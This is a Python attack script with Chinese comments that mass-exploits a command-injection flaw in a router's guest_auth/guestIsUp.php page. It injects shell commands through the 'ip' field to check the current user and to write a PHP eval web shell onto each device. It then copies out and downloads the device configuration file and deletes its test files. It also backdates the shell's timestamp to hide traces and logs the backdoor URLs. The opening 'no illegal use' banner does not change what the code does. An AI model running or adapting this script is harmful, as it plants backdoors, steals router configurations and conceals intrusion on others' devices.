import requests
import os
def head():
    print('\33[1;36m 请勿用户非法用途！！！\33[0m')
    print('\33[1;36m 实际情况和编写代码时的情况有一定的错误\33[0m')
    print('\33[1;36m 因此有一定的错误率，有条件的情况，可以根据实际情况去改写代码\33[0m')
    print('\33[1;36m url输入示例：http://192.168.1.1/ \33[0m')
    print('\33[1;36m 一行一个url \33[0m')
    print('\33[1;36m 文件名输入示例：ip.txt \33[0m')
    print('\33[1;36m 请输入你的文件名')

def test(url):
    global list
    wurl = url + 'guest_auth/whoami.txt'
    purl = url + 'guest_auth/guestIsUp.php'
    curl = url + 'guest_auth/config.txt'
    header = {
        "Content-Type" : "application/x-www-form-urlencoded",
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
    }
    muma = "<?php @eval(\$_POST['pass']) ?>"
    data = {
        'mac' : '1',
        'ip' : '127.0.0.1 | whoami  > whoami.txt'   #测试是否存在漏洞
    }
    dataPhpCode = {
        'mac': '1',
        'ip': '127.0.0.1 | echo "'+muma+'" > guestIsOut.php'    #写入一句话
    }
    datarm = {
        'mac': '1',
        'ip': '127.0.0.1 | rm whoami.txt | touch -t 202001061257 guestIsOut.php | rm config.txt'    #删除测试文件、更改一句话修改时间
    }
    dataconfig = {
        'mac': '1',
        'ip': '127.0.0.1 | cp /data/config.text config.txt'
    }
    ip = url.split('/')[2]
    print('\33[1;35m'+ip+':正在检测\33[0m')
    try:
        res = requests.post(url=purl,headers=header,data=data,timeout=5)
        whoami = requests.get(url=wurl,headers=header)

    except:
        print('\33[1;31m'+ip+': 请求超时！，请检查url输入是否正确')
        print('\33[1;36murl输入示例：http://192.168.1.1/ \33[0m')
        return
    print(purl,wurl)
    print(res.status_code,whoami.status_code)
    if res.status_code == 200 and whoami.status_code == 200:
        print('\33[1;32m'+ip+':存在漏洞，当前用户身份为：\33[0m' + whoami.text )
    else:
        print('\33[1;31m'+ip+':该站点不存在漏洞或已经被修复 \33[0m')
        return
    print('\33[1;35m'+ip+':正在写入一句话木马 \33[0m')
    res = requests.post(url=purl,headers=header,data=dataPhpCode)
    print('\33[1;35m'+ip+':正在获取设备配置文件 \33[0m')
    res = requests.post(url=purl,headers=header,data=dataconfig)
    res = requests.get(url=curl,headers=header)

    if res.status_code == 200:
        text = res.text.encode('utf-8')
        if not os.path.exists('RouterConfig'):
            os.mkdir('RouterConfig')
        fp = open('RouterConfig/'+ip+'.txt','wb')
        fp.write(text)
        fp.close()
    else:
        print('\33[1;31m'+ip+':获取配置文件出错 \33[0m')
    print('\33[1;35m'+ip+':正在清除访问痕迹 \33[0m')
    res = requests.post(url=purl, headers=header, data=datarm)
    list[ip] = url+'guest_auth/guestIsOut.php'
if __name__ == "__main__":
    list = {}
    head()
    filename = input('\33[1;36m >>>')
    fp = open(filename,'r',encoding='utf-8')
    urls = fp.readlines()
    fp.close()
    for url in urls:
        test(url.strip('\n'))
    fp = open('succeed.txt','w',encoding='utf-8')
    fp.write(str(list.items()))
    fp.close()

